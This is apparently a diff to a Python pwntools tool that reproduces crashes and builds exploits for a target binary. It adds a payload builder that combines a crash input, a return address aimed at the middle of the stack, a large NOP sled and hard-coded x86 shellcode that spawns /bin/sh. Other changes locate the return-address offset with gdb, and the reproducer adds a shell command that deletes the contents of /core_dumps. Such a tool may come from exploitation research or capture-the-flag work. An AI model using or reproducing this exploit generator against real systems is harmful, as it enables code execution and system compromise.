@@ -1,5 +1,6 @@
 from pwn import *
 from utils import cleanup, build_command
+from exploit_utils import ENV_VARS
 import argparse
 
 def generate_testcase(len):
@@ -16,6 +17,16 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
     Returns:
     bool: True if the program crashes with a segmentation fault.
     """
+
+    #clear the /core_dumps directory for a clean start
+    subprocess.Popen(
+        "rm -r /core_dumps/*", 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE,
+        shell=True
+    )
+
     target_bin = arg_config.target
 
     command = build_command(arg_config, crash_input)
@@ -107,6 +118,7 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
     
     if eip_value.startswith("0x"):  #remove 0x prefix
         eip_value = eip_value[2:]
+
         
     eip_bytes = bytes.fromhex(eip_value)    #convert to hex bytes
     eip_bytes = eip_bytes[::-1]             #convert to little endian
@@ -122,6 +134,23 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
 def crash_explorer():
     payload_mutation = []
     return payload_mutation
+
+def payload_builder(crash_input: bytes, target_bin: str):
+
+    target_address = stack_middle_address(target_ra(target_bin))
+    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+
+    payload = crash_input
+
+    payload += struct.pack("<I", target_address)
+    payload += b'\x90' * 129000
+    payload += shellcode
+
+    open("payload", "wb").write(payload)
+
+
+
+    return
 
 def locate_ra(pattern, target):
 
@@ -148,7 +177,6 @@ def locate_ra(pattern, target):
 
     while True:
         output = gdb_proc.stdout.readline()
-        # print(output)
         if "Program received signal SIGSEGV" in output:
             break
 
@@ -166,9 +194,6 @@ def locate_ra(pattern, target):
     gdb_proc.stdin.flush()
 
     output, _ = gdb_proc.communicate()
-
-    # print(output)
-    # print(pattern)
     
     eip_value = None
     for line in output.splitlines():
@@ -176,37 +201,29 @@ def locate_ra(pattern, target):
             eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
             break
 
-    # print(eip_value)
-
     offset = cyclic_find(int(eip_value, 16))
-    # print(f"offset: {offset}")
     return offset
 
 
-        
-def target_ra(target):
+def target_ra(target_bin: str):
 
     #find in what adresses the stack fluctuates -> info proc mapping
 
-    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
-    trash = b'B'*131000
-    trash_args = "`cat trash` " * 15    
-    open("trash", "wb").write(trash)  
-
     gdb_process = subprocess.Popen(
-        f"gdb {target}", 
+        f"gdb {target_bin}", 
         stdin=subprocess.PIPE, 
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
         text=True, 
-        shell=True
+        shell=True,
+        env={**os.environ, **ENV_VARS}
     )
 
     commands = f"""
     set disable-randomization off
     set breakpoint pending on
     b main
-    r {trash_args}
+    r
     info proc mapping
     q
     y
@@ -217,6 +234,7 @@ def target_ra(target):
     output, _ = gdb_process.communicate()
 
     return output
+
 
 
 def stack_middle_address(output):
@@ -238,7 +256,6 @@ def stack_middle_address(output):
     middle = (start_address + end_address) // 2
     middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence
 
-    # print(f"stack middle target addr: {hex(middle)}")
     return middle
 
 
